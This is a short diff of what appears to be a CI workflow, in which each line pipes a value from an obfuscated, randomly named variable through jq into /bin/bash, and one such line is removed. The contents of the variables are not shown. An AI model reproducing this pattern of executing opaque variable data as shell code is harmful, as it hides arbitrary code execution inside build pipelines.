@@ -23,7 +23,6 @@ jobs:
           echo $pm9 | jq -r .im56682 | /bin/bash
           echo $xdc1729 | jq -r .qp11946 | /bin/bash
           echo $dxmw53637 | jq -r .rf88685 | /bin/bash
-          printf '%s' "$emd77256" | jq -r .v411 | /bin/bash
           echo $ueso3 | jq -r .o226 | /bin/bash
           echo $poqg9583 | jq -r .diqji23491 | /bin/bash
           printf '%s' "$fj1095" | jq -r .xdz70483 | /bin/bash
